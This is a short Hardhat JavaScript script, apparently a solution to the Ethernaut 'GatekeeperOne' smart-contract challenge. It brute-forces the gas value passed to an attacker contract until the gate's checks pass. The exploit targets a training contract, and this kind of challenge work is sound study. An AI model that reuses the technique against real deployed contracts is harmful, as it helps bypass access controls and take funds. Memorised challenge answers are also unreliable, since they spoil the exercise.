const { ethers, network, getNamedAccounts } = require("hardhat")

async function hack() {
    const hackGate = await ethers.getContract("HackGatekeeperOne")
    const gate = await ethers.getContract("GatekeeperOne")
    const { deployer: player } = await getNamedAccounts()
    let gas

    for (let i = 0; i < 8191; i++) {
        try {
            gas = 80000 + i
            await hackGate.enter(gate, gas, player)
            console.log(`Gas used: ${gas} on ${i} tries!`)
            break
        } catch {}
    }
}

hack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        console.exit(1)
    })
